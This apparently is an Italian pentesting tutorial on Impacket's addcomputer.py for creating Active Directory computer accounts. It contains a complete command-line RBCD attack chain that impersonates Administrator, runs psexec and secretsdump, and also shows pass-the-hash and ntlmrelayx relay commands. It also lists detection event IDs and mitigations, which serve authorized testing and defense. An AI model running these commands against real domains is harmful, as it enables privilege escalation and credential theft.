---
title: 'addcomputer.py Impacket: Creare Computer Account per RBCD'
slug: addcomputer
description: 'Guida a addcomputer.py di Impacket per creare computer account Active Directory via SAMR o LDAPS, verificare MachineAccountQuota e usarli nelle catene RBCD.'
image: /addcomputer-py-active-directory.webp
draft: true
date: 2026-07-26T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - active-directory
  - machine-account-quota
  - rbcd
  - samr
  - ldaps
  - impacket
---

# Come creare computer account Active Directory con addcomputer.py

`addcomputer.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) e crea, elimina o reimposta la password di un computer account in Active Directory, usando credenziali spesso low-privilege grazie a `ms-DS-MachineAccountQuota`. Il computer account creato è raramente un fine in sé — il caso d'uso più comune di gran lunga è [RBCD](https://hackita.it/articoli/rbcd/), ma può tornare utile anche in alcune catene di relay LDAP, AD CS o SCCM a seconda dei permessi ottenuti lungo la strada.

Riferimento ufficiale: [fortra/impacket — addcomputer.py](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)
MITRE ATT\&CK: [T1136.002 — Create Account: Domain Account](https://attack.mitre.org/techniques/T1136/002/)

## MachineAccountQuota — perché funziona con credenziali low-priv

`ms-DS-MachineAccountQuota` è un attributo di dominio che controlla quanti computer account può creare un utente autenticato. Il valore predefinito è **10**. Ma il risultato reale dipende da più fattori insieme, non solo dal valore di MAQ:

* il privilegio [SeMachineAccountPrivilege](https://hackita.it/articoli/semachineaccountquota/) ("Add workstations to domain")
* i permessi di creazione sul container o sulla OU di destinazione
* eventuali deleghe personalizzate
* il numero di oggetti già creati da quello stesso utente, tracciato tramite `msDS-CreatorSID`

Anche con **MAQ = 0**, un account con permesso delegato "Create Computer Objects" su una OU specifica può comunque creare computer account — non serve automaticamente un admin di dominio.

```bash
# Verifica MachineAccountQuota
nxc ldap 10.10.10.5 -u user -p pass -M maq

# oppure via ldapsearch
ldapsearch -x -H ldap://10.10.10.5 -D "user@hackita.local" -w pass \
  -b "DC=hackita,DC=local" "(objectclass=domain)" ms-DS-MachineAccountQuota
```

## Sintassi e opzioni reali

```bash
impacket-addcomputer [opzioni] dominio/utente[:password]
```

| Opzione                | Descrizione                                                                                                                   |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| `-domain-netbios NOME` | Nome NetBIOS del dominio — necessario se il DC espone più domini                                                              |
| `-computer-name NOME`  | Nome del computer account. Se omesso, viene generato un nome casuale `DESKTOP-XXXXXXXX$` (8 caratteri alfanumerici maiuscoli) |
| `-computer-pass PASS`  | Password del computer account. Se omessa, ne viene generata una casuale di **32 caratteri** alfanumerici                      |
| `-no-add`              | Non crea un nuovo oggetto — reimposta solo la password di un computer esistente                                               |
| `-delete`              | Elimina un computer account esistente                                                                                         |
| `-method {SAMR,LDAPS}` | Metodo di creazione (default: `SAMR`)                                                                                         |
| `-port {139,445,636}`  | Porta di destinazione — SAMR usa 445 di default, LDAPS usa 636                                                                |
| `-baseDN DN`           | Base LDAP, usata solo con `-method LDAPS`                                                                                     |
| `-computer-group DN`   | Distinguished Name del container/OU di destinazione, usato solo con `-method LDAPS` — **non** è un gruppo di sicurezza        |
| `-hashes LM:NT`        | Pass-the-Hash                                                                                                                 |
| `-k`                   | Autenticazione Kerberos — **richiede sempre `-dc-host`**                                                                      |
| `-no-pass`             | Con `-k`, non chiedere la password                                                                                            |
| `-aesKey KEY`          | Chiave AES per Kerberos                                                                                                       |
| `-dc-host HOST`        | Hostname del Domain Controller                                                                                                |
| `-dc-ip IP`            | IP del Domain Controller                                                                                                      |
| `-ts`                  | Timestamp nei log                                                                                                             |
| `-debug`               | Output diagnostico                                                                                                            |

**Su `-computer-group`:** non aggiunge il computer a un gruppo di sicurezza — è il DN del container o della OU dove l'oggetto viene creato (es. `OU=Workstations,DC=hackita,DC=local`), e conta solo nel metodo LDAPS. Con SAMR (il metodo di default) questa opzione non ha alcun effetto sul posizionamento dell'oggetto.

**Sul `$` finale:** il codice controlla se il nome fornito termina già con `$` e lo aggiunge solo se manca. `HACKITA` ed `HACKITA$` producono entrambi `HACKITA$` — non esiste un caso di duplicazione `HACKITA$$`.

**Su Kerberos:** se usi `-k` senza specificare `-dc-host`, il tool si ferma subito con `Kerberos auth requires DNS name of the target DC. Use -dc-host.` — non è opzionale in questo scenario.

## Utilizzo pratico

### Creazione base — metodo SAMR (default, porta 445)

```bash
impacket-addcomputer hackita.local/user:Password123 \
  -computer-name 'HACKITA$' \
  -computer-pass 'HackitaPass123!' \
  -dc-ip 10.10.10.5

# Output: Successfully added machine account HACKITA$ with password HackitaPass123!
```

### Senza specificare nome o password

```bash
# Genera nome casuale (DESKTOP-XXXXXXXX$) e password casuale (32 caratteri)
impacket-addcomputer hackita.local/user:Password123 -dc-ip 10.10.10.5
```

Il tool stampa entrambi i valori generati nell'output — salvali subito, ti servono per autenticarti come quel computer account.

### Creazione via LDAPS (porta 636)

Non è "necessaria quando SMB signing blocca SAMR" — SMB signing protegge l'integrità della sessione, non impedisce l'uso di RPC/SAMR. LDAPS diventa un'alternativa reale quando:

* la porta 445/139 è filtrata ma la 636 è raggiungibile
* l'accesso SAMR è limitato da policy (`RestrictRemoteSAM`)
* vuoi controllare esplicitamente l'OU di destinazione
* ti serve che il tool imposti direttamente `dNSHostName` e gli SPN (vedi sezione dedicata sotto)

Richiede che il DC esponga LDAP su TLS con un certificato utilizzabile — se manca, questo metodo semplicemente non funziona.

```bash
impacket-addcomputer hackita.local/user:Password123 \
  -computer-name 'HACKITA_ATTACKER$' \
  -computer-pass 'HackitaAttPass123!' \
  -method LDAPS \
  -dc-ip 10.10.10.5
```

### Creare il computer in una OU specifica (solo LDAPS)

```bash
impacket-addcomputer hackita.local/user:Password123 \
  -computer-name 'HACKITA$' \
  -computer-pass 'HackitaPass123!' \
  -method LDAPS \
  -computer-group 'OU=Workstations,DC=hackita,DC=local' \
  -dc-ip 10.10.10.5
```

Con il metodo SAMR di default, `-computer-group` non ha alcun effetto — l'oggetto finisce comunque dove SAMR lo posiziona di default.

### Pass-the-Hash

```bash
impacket-addcomputer -hashes :NThash hackita.local/user \
  -computer-name 'HACKITA$' \
  -computer-pass 'HackitaPass123!' \
  -dc-ip 10.10.10.5
```

### Kerberos — `-dc-host` obbligatorio

```bash
export KRB5CCNAME=/path/to/ticket.ccache

impacket-addcomputer -k -no-pass hackita.local/user \
  -computer-name 'HACKITA$' \
  -computer-pass 'HackitaPass123!' \
  -dc-host dc01.hackita.local \
  -dc-ip 10.10.10.5
```

Con chiave AES:

```bash
impacket-addcomputer -aesKey AES256KeyQui hackita.local/user \
  -computer-name 'HACKITA$' \
  -computer-pass 'HackitaPass123!' \
  -dc-host dc01.hackita.local
```

### Reimpostare solo la password (`-no-add`)

`-no-add` **non modifica** SPN, `dNSHostName`, gruppi o altri attributi — imposta soltanto una nuova password su un computer account già esistente.

```bash
impacket-addcomputer hackita.local/user:Password123 \
  -computer-name 'HACKITA$' \
  -computer-pass 'NuovaPassword123!' \
  -no-add \
  -dc-ip 10.10.10.5
```

### Elimina il computer account

```bash
impacket-addcomputer hackita.local/user:Password123 \
  -computer-name 'HACKITA$' \
  -dc-ip 10.10.10.5 \
  -delete
```

## SAMR e LDAPS non creano lo stesso oggetto

Questa è la differenza più importante da capire prima di scegliere il metodo.

| Caratteristica                 | SAMR (default)                          | LDAPS                                                                                             |
| ------------------------------ | --------------------------------------- | ------------------------------------------------------------------------------------------------- |
| Porta                          | 445 (o 139)                             | 636                                                                                               |
| Richiede certificato LDAP      | No                                      | Sì                                                                                                |
| `-computer-group`/`-baseDN`    | Ignorati                                | Usati per posizionare l'oggetto                                                                   |
| Imposta `dNSHostName`          | **No**                                  | Sì                                                                                                |
| Imposta `servicePrincipalName` | **No**                                  | Sì — `HOST/nome`, `HOST/nome.dominio`, `RestrictedKrbHost/nome`, `RestrictedKrbHost/nome.dominio` |
| `userAccountControl`           | Impostato a `WORKSTATION_TRUST_ACCOUNT` | Impostato a `0x1000`                                                                              |
| Uso tipico                     | Creazione rapida, nessun controllo fine | Controllo completo su posizione e attributi LDAP                                                  |

Il metodo **SAMR** crea l'oggetto tramite `hSamrCreateUser2InDomain` e imposta password e `userAccountControl`, ma **non** tocca `dNSHostName` né registra alcun SPN. Il metodo **LDAPS** invece scrive direttamente questi attributi in fase di creazione.

Di conseguenza, l'affermazione generica "il computer account ha SPN registrati di default" è falsa per il metodo SAMR. Verifica sempre `servicePrincipalName` e `dNSHostName` dopo la creazione, con lo stesso metodo che userai per il resto della catena:

```bash
ldapsearch -x -H ldap://10.10.10.5 -D "user@hackita.local" -w pass \
  -b "DC=hackita,DC=local" "(sAMAccountName=HACKITA$)" \
  sAMAccountName distinguishedName dNSHostName servicePrincipalName userAccountControl pwdLastSet msDS-CreatorSID
```

## Workflow RBCD — il caso d'uso principale

Il flusso completo è in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

```bash
# STEP 1 — Verifica MAQ
nxc ldap 10.10.10.5 -u user -p pass -M maq

# STEP 2 — Verifica GenericWrite/GenericAll su un target
# (da BloodHound → hackita.it/articoli/bloodhound)

# STEP 3 — Crea computer account controllato
impacket-addcomputer hackita.local/user:Password123 \
  -computer-name 'RBCD_HACKITA$' \
  -computer-pass 'RBCDPass123!' \
  -dc-ip 10.10.10.5

# STEP 4 — Configura RBCD: RBCD_HACKITA$ può delegare su TARGET$
impacket-rbcd -delegate-from 'RBCD_HACKITA$' -delegate-to 'TARGET$' \
  -action write -dc-ip 10.10.10.5 hackita.local/user:Password123

# STEP 5 — getST per impersonare Administrator su TARGET
impacket-getST \
  -spn cifs/TARGET.hackita.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.5 \
  hackita.local/'RBCD_HACKITA$':'RBCDPass123!'

# STEP 6 — Usa il ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass hackita.local/Administrator@TARGET.hackita.local
impacket-secretsdump -k -no-pass hackita.local/Administrator@TARGET.hackita.local

# STEP 7 — Cleanup COMPLETO: prima rimuovi la delega RBCD...
impacket-rbcd -delegate-from 'RBCD_HACKITA$' -delegate-to 'TARGET$' \
  -action remove -dc-ip 10.10.10.5 hackita.local/user:Password123

# ...POI elimina il computer account
impacket-addcomputer hackita.local/user:Password123 \
  -computer-name 'RBCD_HACKITA$' -dc-ip 10.10.10.5 -delete
```

**Il cleanup non finisce con `-delete`.** `msDS-AllowedToActOnBehalfOfOtherIdentity` è un security descriptor scritto sul computer **target**, non sull'account che elimini — cancellare `RBCD_HACKITA$` non rimuove automaticamente la delega configurata su `TARGET$`. Rimuovi sempre prima l'ACE RBCD con `rbcd.py -action remove`, poi elimina il computer account creato.

## Workflow ntlmrelayx — alternativa automatica

[ntlmrelayx.py](https://hackita.it/articoli/ntlmrelayx/) con `--delegate-access` fa tutto questo automaticamente durante un relay LDAPS — crea il computer account, configura RBCD, e stampa le credenziali in un solo passaggio. addcomputer.py serve quando vuoi ottenere lo stesso risultato manualmente, con credenziali dirette invece di un relay attivo.

```bash
# Automatico (relay)
sudo ntlmrelayx.py -t ldaps://DC_IP --delegate-access -smb2support

# Manuale (con credenziali)
impacket-addcomputer hackita.local/user:Password123 \
  -computer-name 'HACKITA$' -computer-pass 'Pass123!' -dc-ip DC_IP
# → poi configura RBCD manualmente con rbcd.py
```

## Alternative operative

```bash
# bloodyAD
bloodyAD -u user -p 'pass' -d hackita.local --host 10.10.10.5 add computer 'hackita$' 'HackitaPass123!'

# Certipy
certipy account create -u 'user@hackita.local' -p 'pass' -dc-ip 10.10.10.5 -user 'hackita$' -pass 'HackitaPass123!'
```

PowerMad (`New-MachineAccount`) è l'equivalente PowerShell nativo, utile quando operi già da un host Windows dominio-joined senza voler introdurre Impacket nella catena. `ldeep` offre lo stesso risultato via `ldeep ldap create_computer`, se preferisci uno strumento LDAP-centrico già in uso per altre enumerazioni.

## Cosa puoi fare con un computer account — e cosa NON puoi dare per scontato

Un computer account che controlli è membro di `Domain Computers` e può autenticarsi al dominio, ma questo **non** significa automaticamente:

* che sia amministratore locale su qualche host
* che possa accedere a share amministrative
* che possa usare WinRM
* che tool pensati per account utente funzionino allo stesso modo con un'identità macchina

Vede solo le risorse concesse esplicitamente alla sua identità o al gruppo `Domain Computers`. Una connessione riuscita con NetExec dimostra solo che l'autenticazione funziona, non che tu abbia accesso privilegiato.

| Uso                                 | Nota                                                                                                                                                                                                                                                                               |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **RBCD**                            | Configura `msDS-AllowedToActOnBehalfOfOtherIdentity` sul target — il caso d'uso principale                                                                                                                                                                                         |
| **Unconstrained Delegation**        | Se hai anche `SeEnableDelegationPrivilege` (o diritti equivalenti), puoi impostare il computer creato come trusted for delegation e raccogliere TGT in transito da sistemi privilegiati che vi si autenticano — richiede però che il fake host sia risolvibile via DNS nel dominio |
| **Autenticazione Kerberos di base** | Ottieni un TGT come quel computer, utile per recon autenticato minimo                                                                                                                                                                                                              |
| **Kerberoasting**                   | Non ha senso operativo: conosci già la password che hai impostato tu stesso                                                                                                                                                                                                        |
| **AS-REP Roasting**                 | Non applicabile per impostazione predefinita — `addcomputer.py` non abilita `DONT_REQUIRE_PREAUTH` sull'account creato                                                                                                                                                             |
| **Shadow Credentials**              | Non è un prerequisito automatico — serve comunque accesso in scrittura a `msDS-KeyCredentialLink` sull'account target, indipendente dal fatto di controllare un computer account                                                                                                   |

## Errori comuni

| Errore                                                    | Causa                                                                | Verifica                                                               |
| --------------------------------------------------------- | -------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| `Machine account quota exceeded` (LDAPS, codice `0x216D`) | MAQ raggiunto o = 0 senza delega specifica                           | Verifica MAQ, `SeMachineAccountPrivilege` e permessi delegati sulla OU |
| `STATUS_ACCESS_DENIED` / codice SAMR `0xc0000022`         | L'utente non ha diritto di creare/modificare/eliminare quel computer | Verifica MAQ e privilegi, non presumere serva sempre un admin          |
| `Account already exists`                                  | Nome già in uso                                                      | Scegli un nome diverso, o usa `-no-add`/`-delete` sull'esistente       |
| `Account not found` (SAMR, codice `0xc0000073`)           | Stai usando `-no-add`/`-delete` su un nome che non esiste            | Verifica il nome esatto del computer account                           |
| `LDAP error: insufficientAccessRights`                    | Metodo LDAPS senza permessi sufficienti                              | Prova SAMR, oppure un account con permessi di scrittura LDAP sulla OU  |
| `Kerberos auth requires DNS name of the target DC`        | Hai usato `-k` senza `-dc-host`                                      | Aggiungi sempre `-dc-host` quando usi Kerberos                         |

## Detection e mitigazioni

| Event ID | Significato                                                                          |
| -------- | ------------------------------------------------------------------------------------ |
| `4741`   | Computer account creato                                                              |
| `4742`   | Computer account modificato                                                          |
| `4743`   | Computer account eliminato                                                           |
| `5136`   | Attributo AD modificato — registrato solo se auditing e SACL appropriata sono attivi |
| `5137`   | Oggetto Directory Service creato                                                     |
| `5141`   | Oggetto Directory Service eliminato                                                  |

**Mitigazioni:**

* Impostare `ms-DS-MachineAccountQuota` a `0` se il domain join self-service non serve
* Rimuovere `SeMachineAccountPrivilege` dagli utenti generici
* Delegare la creazione di computer object solo su OU specifiche, con permessi tracciabili
* Monitorare periodicamente `msDS-CreatorSID` per identificare pattern di creazione anomali
* Monitorare modifiche a `servicePrincipalName`, `dNSHostName` e soprattutto `msDS-AllowedToActOnBehalfOfOtherIdentity`
* Nomi macchina che non seguono la convenzione di provisioning aziendale sono un segnale concreto da controllare

## Cheat Sheet

```bash
# Crea computer account (SAMR — default)
impacket-addcomputer hackita.local/user:pass \
  -computer-name 'HACKITA' -computer-pass 'HackitaPass123!' -dc-ip DC_IP

# Crea via LDAPS, con OU specifica
impacket-addcomputer hackita.local/user:pass \
  -computer-name 'HACKITA' -computer-pass 'HackitaPass123!' \
  -method LDAPS -computer-group 'OU=Workstations,DC=hackita,DC=local' -dc-ip DC_IP

# Pass-the-Hash
impacket-addcomputer -hashes :NThash hackita.local/user \
  -computer-name 'HACKITA' -computer-pass 'HackitaPass123!' -dc-ip DC_IP

# Kerberos (richiede -dc-host)
impacket-addcomputer -k -no-pass hackita.local/user \
  -computer-name 'HACKITA' -computer-pass 'HackitaPass123!' \
  -dc-host dc01.hackita.local -dc-ip DC_IP

# Verifica MAQ
nxc ldap DC_IP -u user -p pass -M maq

# Reimposta solo la password
impacket-addcomputer hackita.local/user:pass \
  -computer-name 'HACKITA' -computer-pass 'NuovaPass!' -no-add -dc-ip DC_IP

# Elimina (cleanup)
impacket-addcomputer hackita.local/user:pass -computer-name 'HACKITA' -dc-ip DC_IP -delete

# Workflow RBCD completo
# 1. addcomputer → crea HACKITA$
# 2. rbcd.py -action write -delegate-from HACKITA$ -delegate-to TARGET$
# 3. getST -spn cifs/TARGET -impersonate Administrator hackita.local/'HACKITA$':'pass'
# 4. export KRB5CCNAME=Administrator.ccache → psexec / secretsdump
# 5. rbcd.py -action remove → PRIMA rimuovi la delega
# 6. addcomputer -delete → POI elimina il computer account
```

## Articoli correlati

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [getST.py](https://hackita.it/articoli/getst/)
* [ntlmrelayx.py](https://hackita.it/articoli/ntlmrelayx/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [BloodHound](https://hackita.it/articoli/bloodhound/)
* [SeMachineAccountPrivilege / MachineAccountQuota](https://hackita.it/articoli/semachineaccountquota/)
* [ldapsearch](https://hackita.it/articoli/ldapsearch/)
* [bloodyAD](https://hackita.it/articoli/bloodyad/)
* [Certipy](https://hackita.it/articoli/certipy/)
* [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)

> Uso esclusivo in ambienti autorizzati.
